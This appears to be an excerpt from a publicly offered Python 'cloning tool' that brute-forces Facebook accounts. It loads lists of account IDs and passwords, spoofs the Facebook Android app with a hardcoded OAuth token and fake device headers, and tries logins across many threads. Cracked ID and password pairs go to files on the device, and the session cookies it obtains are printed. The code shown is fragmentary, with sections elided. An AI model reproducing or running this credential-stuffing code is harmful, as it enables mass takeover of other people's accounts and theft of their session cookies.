...
\033[1;96m           ╚══╝╚═══╝──╚╝──╚═══╝╚═╝╚═╝
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[\033[1;91m●\033[1;91m] CREATOR   \033[1;91m፧ \033[1;91mJAEI SIRVUIX
[\033[1;92m●\033[1;92m] TYPE      \033[1;92m፧ \033[1;92mCLONING TOOL             
[\033[1;93m●\033[1;93m] STATUS    \033[1;93m፧ \033[1;93mPUBLIC           
[\033[1;94m●\033[1;94m] SYSTEM    \033[1;94m፧ \033[1;94mDATA    
[\033[1;95m●\033[1;95m] FACEBOOK  \033[1;95m፧ \033[1;95mhttps://facebook.com/ujfye
[\033[1;96m●\033[1;96m] VERSION   \033[1;96m፧ \033[1;96m3.2
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
...
def Spy():
	...
	if me in ["1", "01","11","A","a"]:
		clear()
		file = input(f' [?] ❯ ENTER FILE PATH \033[1;37m : ')
		try:
		...
		for i in range(ps_limit):
			plist.append(input(f' [+] ❯ PASSWORD NO. {i+1}: '))
	 
		cx=input(f'\n [?] ❯ DO YOU WANT TO SHOW DEAD ACCOUNTS? (y/n): ')
		...
		with tred(max_workers=30) as crack_submit:
			...
			print(f' [+] ❯ TOTAL ACCOUNT : \033[1;32m'+total_ids+f' \n \033[1;37m[+] ❯ METHOD : \033[1;37mM{mthd}')
			print(f"\033[1;37m [+] ❯ USE FLIGHT MODE IF NO RESULT\033[1;37m")
			print(f"\033[1;37m [+] ❯ DEAD / ALIVE IDS WILL BE SAVE IN\033[1;37m")
			print(f"\033[1;37m [+] ❯ /sdcard/JS-ALIVE.txt & /sdcard/JS-DEAD.txt\033[1;37m")
			linex()
			for user in fo:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m JS-RUNNING ❯ %s | \033[1;32mALIVE || %s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;91m[+] JS-ALIVE  ❯ %s'%(ids))
                                print(f'\r\r\033[1;91m[+] PASSWORD  ❯ %s'%(pas))
                                open(f'/sdcard/JS-ALIVE.txt', 'a').write(ids+' ❯ '+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m JS-DEAD ❯ '+ids+' ~ '+pas+'\033[1;97m')
                                        open(f'/sdcard/JS-DEAD.txt', 'a').write(ids+' ❯ '+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m JS-ALIVE ❯ %s ~ %s'%(ids,pas))
                                print('\r\r\033[1;31m{COOKIES} : %s '%(kuki))
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m JS-ALIVE ❯ '+ids+' ~ '+pas+'\033[1;97m')
                                        open(f'/sdcard/JS-ALIVE.txt','a').write(ids+' ❯ '+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m JS-RUNNING ❯ %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(f' ')[0]
                        try:
                                ln = names.split(f' ')[1]
                        except:
...
def rcrack_free(idf,pwv):
    ...
    'viewport-width': '980',}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92mJS-ALIVE ❯ '+idf+' ~ '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91mJS-DEAD ❯ '+idf+' ~ '+ps+'\033[0;97m')
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                head = {
                                        ...
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12; SM-G973F Build/SP1A.210812.016) [FBAN/FB4A;FBAV/540.0.0.84.626;FBBV/169717250;FBDM/{density=4.0,width=1532,height=2560};FBLC/en_US;FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9300I;FBSV/6.0.0;FBCA/armeabi-v7a:armeabi;]',
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
